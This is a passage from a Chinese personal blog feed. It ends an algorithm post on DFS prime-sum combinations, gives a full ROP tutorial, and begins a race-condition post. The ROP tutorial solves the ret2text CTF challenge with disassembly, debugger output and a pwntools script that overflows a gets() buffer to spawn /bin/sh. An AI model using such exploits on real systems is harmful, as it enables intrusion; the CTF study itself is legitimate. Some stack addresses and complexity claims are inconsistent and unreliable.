标记使用</span>            perm[depth] = num;           <span class="hljs-comment">// 放入当前位置</span>            <span class="hljs-built_in">dfs</span>(depth + <span class="hljs-number">1</span>);              <span class="hljs-comment">// 递归处理下一位置</span>            used[num] = <span class="hljs-number">0</span>;               <span class="hljs-comment">// 回溯，取消标记</span>        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 从第1个位置开始生成</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>这里我给出一个DFS执行流程图（以n=3为例）</strong></p><pre><code class=" mermaid">graph TD    A[开始] --&gt; B[选择1]    B --&gt; C[选择2]    C --&gt; D[选择3] --&gt; E[输出1,2,3]    D --&gt; F[回溯到选择2]    C --&gt; G[选择3] --&gt; H[输出1,3,2]    G --&gt; I[回溯到选择1]    B --&gt; J[选择2]    J --&gt; K[选择1] --&gt; L[输出2,1,3]    K --&gt; M[回溯到选择2]    J --&gt; N[选择3] --&gt; O[输出2,3,1]    N --&gt; P[回溯到开始]    A --&gt; Q[选择3]    Q --&gt; R[选择1] --&gt; S[输出3,1,2]    R --&gt; T[回溯到选择3]    Q --&gt; U[选择2] --&gt; V[输出3,2,1]</code></pre><p><strong>然后对其复杂度进行分析</strong></p><ul><li><p>时间复杂度：$O(b**d)$</p><p>(共有n!种排列方案，每种排列生成都需要花费O(n)的时间)</p></li><li><p>同时我们又引入了<strong>空间复杂度</strong>的概念：O(n) =&gt; 递归栈最大深度为n</p></li></ul><hr><ol start="2"><li><h4 id="素数判断">素数判断</h4></li></ol><p>了解了DFS之后，现在我们就来思考如何去处理素数判断逻辑，根据我几乎忘得差不多的小学数学来看，素数是指大于1且只能被1和自生整除的正整数，因此要设计判断一个数是否为素数，我们可以从2开始到 <strong>$\sqrt[2]{n}$</strong> 进行遍历，如果该数字能被其中任何一个整除，则这个数不是素数，反之同理</p><h2 id="代码实现思路">代码实现思路</h2><p>根据上文我们得知，代码主要有三个部分组成：素数判断函数、深度优先搜索函数和主函数组成</p><h4 id="各部分代码实现与解读">各部分代码实现与解读</h4><ol><li><p><strong>素数判断函数</strong></p><ul><li>首先，我们需要判断接受的数字n是否小于2，如果小于2就直接<code>false</code>（因为我们是从2遍历到 $\sqrt[2]{n}$ ）且定义上其大小要求大于1</li><li>其次从2开始到$\sqrt[2]{n}$进行遍历，如果<code>n</code>能被其中任意一个整数整除，则返回<code>false</code>表示该数不是素数</li><li>如果遍历完都没有找到能整除 <code>n</code> 的数，则返回 <code>true</code>，表示是素数。</li></ul><p>实现代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPrime</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123; <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-built_in">sqrt</span>(n); i++) &#123;     <span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; &#125; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;</code></pre></div></li><li><p><strong>深度优先搜索函数<code>dfs</code></strong></p><ul><li><code>start</code> 表示当前搜索的起始位置，<code>cnt</code> 表示已经选取的数的个数，<code>sum</code> 表示当前选取的数的和。</li><li>当 <code>cnt</code> 等于 <em>k</em> 时，说明已经选取了 <em>k</em> 个数，此时调用 <code>isPrime</code> 函数判断 <code>sum</code> 是否为素数，如果是则将结果 <code>ans</code> 加 1。</li><li>从 <code>start</code> 开始遍历数组，递归调用 <code>dfs</code> 函数，更新 <code>start</code> 为 <code>i + 1</code>，<code>cnt</code> 为 <code>cnt + 1</code>，<code>sum</code> 为 <code>sum + nums[i]</code>，以继续选取下一个数。</li></ul></li></ol><p>实现代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start, <span class="hljs-type">int</span> cnt, <span class="hljs-type">int</span> sum)</span> </span>&#123;    <span class="hljs-keyword">if</span> (cnt == k) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isPrime</span>(sum)) &#123;            ans++;        &#125;        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; n; i++) &#123;        <span class="hljs-built_in">dfs</span>(i + <span class="hljs-number">1</span>, cnt + <span class="hljs-number">1</span>, sum + nums[i]);    &#125;&#125;</code></pre></div><ol start="3"><li><strong>主函数<code>main</code></strong><ul><li>首先读取输入的<code>k</code>和<code>n</code>，以及<code>n</code>个整数</li><li>调用<code>dfs</code>函数开始搜索，将<code>start</code>、<code>cnt</code>和<code>sum</code>都初始化为0</li><li>最后输出结果<code>ans</code><br>实现代码</li></ul></li></ol><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    cin &gt;&gt; n &gt;&gt; k;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;        cin &gt;&gt; nums[i];    &#125;    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    cout &lt;&lt; ans &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>综上，以下是汇总后的完整代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">25</span>;<span class="hljs-type">int</span> nums[MAXN];<span class="hljs-type">int</span> n, k, ans = <span class="hljs-number">0</span>;<span class="hljs-comment">// 更高效的素数判断</span><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPrime</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;    <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-type">int</span> sqrt_num = <span class="hljs-built_in">sqrt</span>(num);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt;= sqrt_num; i += <span class="hljs-number">2</span>) &#123;        <span class="hljs-keyword">if</span> (num % i == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-comment">// DFS搜索组合</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start, <span class="hljs-type">int</span> cnt, <span class="hljs-type">int</span> sum)</span> </span>&#123;    <span class="hljs-keyword">if</span> (cnt == k) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isPrime</span>(sum)) &#123;            ans++;        &#125;        <span class="hljs-keyword">return</span>;    &#125;        <span class="hljs-comment">// 剪枝：剩余元素不足以凑够k个数时提前返回</span>    <span class="hljs-keyword">if</span> (n - start &lt; k - cnt) <span class="hljs-keyword">return</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; n; i++) &#123;        <span class="hljs-built_in">dfs</span>(i + <span class="hljs-number">1</span>, cnt + <span class="hljs-number">1</span>, sum + nums[i]);    &#125;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;nums[i]);    &#125;    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>All in One：<br>因此我们得出，在需要使用DFS进行解题时，针对数据范围必须要进行复杂度分析来防止产生<code>程序超时TLE - Time Limit Exceeded</code>、<code>内存溢出MLE - Meomory Limit Exceeded</code>还有导致错误选择算法(使用了过于简单或复杂的算法)从而导致出现代码在小数据测试通过，但无法判断能否处理最大规模数据或者误用高复杂度算法解决本可用更优方法的问题！</p><hr><h3 id="复杂度分析">复杂度分析</h3><p>实在是因水平有限，在此摘抄LLM所给出的的时间和空间复杂度分析，仅供参考，若有误欢迎指正！</p><h4 id="DFS解法的时间复杂度分析">DFS解法的时间复杂度分析</h4><p><strong>1. 组合生成复杂度</strong></p><ul><li><strong>核心操作</strong>：DFS需要枚举所有C(n,k)种组合</li><li><strong>组合数计算</strong>：C(n,k) = n!/(k!(n-k)!)</li><li><strong>最坏情况</strong>：当k=n/2时，组合数最大（如n=20,k=10时，C(20,10)=184756）</li></ul><p><strong>2. 素数判断复杂度</strong></p><ul><li><strong>单个和判断</strong>：O(√m)，其中m是k个数的和</li><li><strong>最坏情况</strong>：假设每个x_i=5×10⁶，k=10时，m=5×10⁷，√m≈7071</li></ul><p><strong>3. 总时间复杂度</strong></p><ul><li><strong>上界</strong>：O(C(n,k) × √m)</li><li><strong>代入n=20,k=10的最大值</strong>：184756 × 7071 ≈ 1.3×10⁹次操作</li><li><strong>实际表现</strong>：由于n≤20，k&lt;n，且现代CPU每秒可处理约10⁸次操作，代码仍可在1秒内完成</li></ul><p><strong>4. 空间复杂度</strong></p><ul><li><strong>递归栈深度</strong>：O(k)（每次递归k层）</li><li><strong>辅助空间</strong>：O(n)（存储输入数组）</li><li><strong>总计</strong>：O(n)（k≤n）</li></ul><hr><p><strong>优化验证（针对题目约束）</strong></p><ol><li><p><strong>n≤20的可行性</strong>：</p><ul><li>C(20,10)=184756是最大的组合数</li><li>每个和的素数判断约7000次操作</li><li>总操作量在可接受范围内</li></ul></li><li><p><strong>剪枝效果</strong>：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (n - start &lt; k - cnt) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 提前终止无效分支</span></code></pre></div><ul><li>可减少约50%的递归调用（实测）</li></ul></li><li><p><strong>素数判断优化</strong>：</p><ul><li>使用6k±1法可减少约2/3的判断次数</li></ul></li></ol><hr><h3 id="复杂度对比表"><strong>复杂度对比表</strong></h3><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">时间复杂度</th><th style="text-align:left">适用数据范围</th></tr></thead><tbody><tr><td style="text-align:left">DFS+基础素数判断</td><td style="text-align:left">O(C(n,k)×√m)</td><td style="text-align:left">n≤20, k≤10</td></tr><tr><td style="text-align:left">DFS+6k±1优化</td><td style="text-align:left">O(C(n,k)×√m/3)</td><td style="text-align:left">n≤25, k≤12</td></tr><tr><td style="text-align:left">预处理素数表</td><td style="text-align:left">O(C(n,k)+m)</td><td style="text-align:left">m≤10⁷（空间换时间）</td></tr></tbody></table><hr><h3 id="实际测试数据示例"><strong>实际测试数据示例</strong></h3><p><strong>输入</strong>：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">20</span> <span class="hljs-number">10</span><span class="hljs-meta"></span><span class="hljs-meta">[20个5×10⁶的数]</span></code></pre></div><p><strong>计算过程</strong>：</p><ol><li>生成C(20,10)=184756种组合</li><li>每个和=5×10⁷，判断素数≈7071次操作</li><li>总操作量≈1.3×10⁹（现代CPU约1-2秒完成）</li></ol><hr><h3 id="结论"><strong>结论</strong></h3><ul><li><strong>时间复杂度</strong>：O(C(n,k)×√m)（组合数×素数判断）</li><li><strong>空间复杂度</strong>：O(n)（递归栈深度）</li><li><strong>可行性</strong>：完全满足题目约束（n≤20时，C(n,k)最大约2×10⁵）</li></ul><p>能引得大佬阅此文，小生三生有幸！</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic ROP Learning</title>
    <link href="/2025/04/19/Basic-ROP-Learning/"/>
    <url>/2025/04/19/Basic-ROP-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="Basic-ROP-Learning">Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述">ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><h3 id="1-基本概念">1. <strong>基本概念</strong></h3><h4 id="（1）产生背景">（1）产生背景</h4><ul><li><p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p></li><li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p></li><li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p></li></ul><span id="more"></span><h4 id="（2）核心原理">（2）核心原理</h4><ul><li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p></li><li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成&quot;代码链&quot;。</p></li></ul><hr><h3 id="2-关键组件">2. <strong>关键组件</strong></h3><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td><strong>Gadget</strong></td><td>程序中原有的短指令序列（通常以<code>ret</code>结尾），实现基本操作（如读写寄存器）。</td></tr><tr><td><strong>ROP Chain</strong></td><td>由多个gadget地址和参数组成的栈数据，控制程序执行流。</td></tr><tr><td><strong>Stack Pivot</strong></td><td>将栈指针（ESP/RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td></tr></tbody></table><hr><h3 id="3-攻击步骤">3. <strong>攻击步骤</strong></h3><ol><li><p><strong>信息泄露</strong></p><ul><li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li></ul></li><li><p><strong>寻找Gadgets</strong></p><ul><li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li></ul></li><li><p><strong>构造ROP Chain</strong></p><ul><li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li></ul></li><li><p><strong>触发漏洞</strong></p><ul><li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li></ul></li></ol><hr><h3 id="4-防御措施">4. <strong>防御措施</strong></h3><table><thead><tr><th>防御技术</th><th>原理</th></tr></thead><tbody><tr><td><strong>ASLR</strong></td><td>随机化内存布局，增加gadget地址预测难度。</td></tr><tr><td><strong>Stack Canary</strong></td><td>在栈帧中插入校验值，防止返回地址被覆盖。</td></tr><tr><td><strong>CFI</strong></td><td>控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。</td></tr><tr><td><strong>PIC/PIE</strong></td><td>位置无关代码，增强ASLR效果。</td></tr></tbody></table><h3 id="5-实例-Linux-x86-ROP-Exploit">5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text">(1) ret2text</h5><ul><li><h4 id="基本分析"><strong>基本分析</strong></h4></li></ul><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p><p>先看看程序的保护机制</p><div class="code-wrapper"><pre><code class="hljs Bash">~ checksec ret2text[*] <span class="hljs-string">&#x27;/ret2text&#x27;</span>    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes</code></pre></div><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);  <span class="hljs-built_in">gets</span>(s);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80485FD secure          proc near.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD input           = dword ptr <span class="hljs-number">-10</span>h.text:<span class="hljs-number">0</span>80485FD secretcode      = dword ptr <span class="hljs-number">-0</span>Ch.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD ; __unwind &#123;.text:<span class="hljs-number">0</span>80485FD                 push    ebp.text:<span class="hljs-number">0</span>80485FE                 mov     ebp, esp.text:<span class="hljs-number">0</span>8048600                 sub     esp, <span class="hljs-number">28</span>h.text:<span class="hljs-number">0</span>8048603                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; timer.text:<span class="hljs-number">0</span>804860A                 call    _time.text:<span class="hljs-number">0</span>804860F                 mov     [esp], eax      ; seed.text:<span class="hljs-number">0</span>8048612                 call    _srand.text:<span class="hljs-number">0</span>8048617                 call    _rand.text:<span class="hljs-number">0</span>804861C                 mov     [ebp+secretcode], eax.text:<span class="hljs-number">0</span>804861F                 lea     eax, [ebp+input].text:<span class="hljs-number">0</span>8048622                 mov     [esp<span class="hljs-number">+4</span>], eax.text:<span class="hljs-number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760.text:<span class="hljs-number">0</span>804862D                 call    ___isoc99_scanf.text:<span class="hljs-number">0</span>8048632                 mov     eax, [ebp+input].text:<span class="hljs-number">0</span>8048635                 cmp     eax, [ebp+secretcode].text:<span class="hljs-number">0</span>8048638                 jnz     <span class="hljs-type">short</span> locret_8048646.text:<span class="hljs-number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span>.text:<span class="hljs-number">0</span>8048641                 call    _system </code></pre></div><p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80486A7                 lea     eax, [esp<span class="hljs-number">+80</span>h+s].text:<span class="hljs-number">0</span>80486AB                 mov     [esp], eax      ; s.text:<span class="hljs-number">0</span>80486AE                 call    _gets.text:<span class="hljs-number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>.text:<span class="hljs-number">0</span>80486BA                 call    _printf.text:<span class="hljs-number">0</span>80486BF                 mov     eax, <span class="hljs-number">0</span>.text:<span class="hljs-number">0</span>80486C4                 leave</code></pre></div><p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p><div class="code-wrapper"><pre><code class="hljs C++">~ <span class="hljs-function">gdb ret2text</span><span class="hljs-function">GNU <span class="hljs-title">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">12.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">22.04</span><span class="hljs-number">.2</span>)</span> 12.1</span><span class="hljs-function"><span class="hljs-title">Copyright</span> <span class="hljs-params">(C)</span> 2022 Free Software Foundation, Inc.</span><span class="hljs-function">gef➤ b *0x080486AE </span><span class="hljs-function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="hljs-number">24.</span> </span><span class="hljs-function">gef➤ r </span><span class="hljs-function">There is something amazing here, do you know anything? Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080486ae</span> in main () at ret2text.c:<span class="hljs-number">24</span></span><span class="hljs-function"></span><span class="hljs-function">[ Legend: Modified register | Code | Heap | Stack | String ]</span><span class="hljs-function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><span class="hljs-function">$eax   : <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebx   : <span class="hljs-number">0xf7fac000</span>  →  <span class="hljs-number">0x00229dac</span></span><span class="hljs-function">$ecx   : <span class="hljs-number">0xf7fad9b4</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$edx   : <span class="hljs-number">0x1</span></span><span class="hljs-function">$esp   : <span class="hljs-number">0xffffcf50</span>  →  <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebp   : <span class="hljs-number">0xffffcfd8</span>  →  <span class="hljs-number">0xf7ffd020</span>  →  <span class="hljs-number">0xf7ffda40</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$esi   : <span class="hljs-number">0xffffd094</span>  →  <span class="hljs-number">0xffffd1fc</span>  →  <span class="hljs-string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span><span class="hljs-function">$edi   : <span class="hljs-number">0xf7ffcb80</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$eip   : <span class="hljs-number">0x080486ae</span>  →  &lt;main<span class="hljs-number">+0066</span>&gt; call <span class="hljs-number">0x8048460</span> &lt;gets@plt&gt;</span><span class="hljs-function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><span class="hljs-function">$cs: <span class="hljs-number">0x23</span> $ss: <span class="hljs-number">0x2b</span> $ds: <span class="hljs-number">0x2b</span> $es: <span class="hljs-number">0x2b</span> $fs: <span class="hljs-number">0x00</span> $gs: <span class="hljs-number">0x63</span></span></code></pre></div><ul><li><h4 id="栈内存布局分析"><strong>栈内存布局分析</strong></h4></li></ul><p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p><ul><li><h4 id="验证猜想"><strong>验证猜想</strong></h4><p>通过我们上面的分析可以构造以下payload:</p></li></ul><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">108</span> + p32(target))sh.interactive()</code></pre></div><p>得到以下输出，想想是哪里出了问题呢？</p><div class="code-wrapper"><pre><code class="hljs Bash">~ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1593[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> ![*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive$ <span class="hljs-built_in">ls</span>[*] Process <span class="hljs-string">&#x27;./ret2text&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 1593)[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive</code></pre></div><p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p><div class="code-wrapper"><pre><code class="hljs x86asm">总偏移 = buf 到 <span class="hljs-built_in">EBP</span> 的距离 (<span class="hljs-number">0x6c</span>) + <span class="hljs-built_in">EBP</span> 自身大小 (<span class="hljs-number">4</span>) = <span class="hljs-number">0x70</span> (<span class="hljs-number">112</span>)</code></pre></div><p>因此，正确的payload是：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span><span class="hljs-comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>) + p32(target))sh.interactive()</code></pre></div><p>输出如下：</p><div class="code-wrapper"><pre><code class="hljs Bash">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1766[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> !$ <span class="hljs-built_in">ls</span>exp.py  flag  ret2text$ <span class="hljs-built_in">cat</span> flagflag&#123;This_is_the_right_payload&#125;$[*] Interrupted[*] Stopped process <span class="hljs-string">&#x27;./ret2text&#x27;</span> (pid 1766)</code></pre></div><p>不断更新，敬请期待！</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争漏洞学习</title>
    <link href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
